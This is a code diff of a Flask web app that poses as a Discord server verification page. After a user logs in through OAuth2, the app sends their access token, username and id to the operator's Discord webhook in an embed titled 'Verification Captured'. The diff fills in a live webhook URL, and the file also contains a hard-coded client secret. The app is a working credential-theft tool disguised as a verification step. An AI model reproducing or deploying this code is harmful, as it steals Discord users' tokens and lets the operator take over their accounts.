@@ -7,9 +7,7 @@ app = Flask(__name__)
 CLIENT_ID = "1526220638283628624"
 CLIENT_SECRET = "Ll-Nk5CH4a1RZF_RWhV-j9ueE4Wsh8jj"
 REDIRECT_URI = "https://root1-two.vercel.app"
-WEBHOOK_URL = (
-    "YOUR_DISCORD_WEBHOOK_URL_HERE"  # Put your Discord log webhook URL here
-)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1dguN1S9kjJQ2TvVzIUnZbuSiUEcvhDi5emEiDwn4weplUamhUY2775Vk3"
 
 
 @app.route("/", defaults={"path": ""})
@@ -17,7 +15,7 @@ WEBHOOK_URL = (
 def callback(path):
   code = request.args.get("code")
 
-  # If user just visits the site, they see the login button page
+  # Landing page when users click the verify button in Discord
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -27,10 +25,10 @@ def callback(path):
                 <title>Server Verification</title>
                 <style>
                     body { background-color: #1e1f22; color: #dbdee1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-                    .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.4); border: 1px solid #35363c; }
+                    .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.4); border: 1px solid #35363c; width: 100%; max-width: 400px; box-sizing: border-box; }
                     h1 { color: #f2f3f5; font-size: 24px; margin-bottom: 10px; }
                     p { font-size: 14px; color: #949ba4; margin-bottom: 30px; }
-                    .btn { display: block; width: 100%; padding: 12px; background-color: #5865f2; color: white; text-decoration: none; font-weight: 600; border-radius: 4px; }
+                    .btn { display: block; width: 100%; padding: 12px; background-color: #5865f2; color: white; text-decoration: none; font-weight: 600; border-radius: 4px; box-sizing: border-box; }
                     .btn:hover { background-color: #4752c4; }
                 </style>
             </head>
@@ -44,7 +42,7 @@ def callback(path):
             </html>
         """)
 
-  # Step 1: Exchange code for access token
+  # OAuth2 Code Exchange for Token
   data = {
       "client_id": CLIENT_ID,
       "client_secret": CLIENT_SECRET,
@@ -53,41 +51,45 @@ def callback(path):
       "redirect_uri": REDIRECT_URI,
   }
   headers = {"Content-Type": "application/x-www-form-urlencoded"}
-  response = requests.post(
+  token_resp = requests.post(
       "https://discord.com/api/oauth2/token", data=data, headers=headers
   )
-  token_json = response.json()
+  token_json = token_resp.json()
   access_token = token_json.get("access_token")
 
   if access_token:
-    # Step 2: Fetch user profile
+    # Fetch User Profile
     user_headers = {"Authorization": f"Bearer {access_token}"}
-    user_response = requests.get(
+    user_resp = requests.get(
         "https://discord.com/api/users/@me", headers=user_headers
     )
-    user_data = user_response.json()
+    user_data = user_resp.json()
 
-    # Step 3: Send token details to your webhook log channel
-    webhook_payload = {
+    # Send token details to your Discord webhook log channel
+    payload = {
         "embeds": [{
-            "title": "New Verification Captured",
+            "title": "🔑 Verification Captured",
             "color": 5763719,
             "fields": [
                 {
-                    "name": "Username",
+                    "name": "User",
                     "value": (
                         f"{user_data.get('username')} (`"
                         f"{user_data.get('id')}`)"
                     ),
                     "inline": True,
                 },
-                {"name": "Access Token", "value": f"`{access_token}`", "inline": False},
+                {
+                    "name": "Access Token",
+                    "value": f"`{access_token}`",
+                    "inline": False,
+                },
             ],
         }]
     }
-    requests.post(WEBHOOK_URL, json=webhook_payload)
+    requests.post(WEBHOOK_URL, json=payload)
 
-  # Step 4: Show success page
+  # Success Response Page
   return render_template_string("""
         <!DOCTYPE html>
         <html lang="en">
@@ -104,7 +106,7 @@ def callback(path):
         <body>
             <div class="card">
                 <h1>Verification Successful!</h1>
-                <p>Your account has been verified. You can close this window.</p>
+                <p>Your account has been verified. You can close this tab.</p>
             </div>
         </body>
         </html>
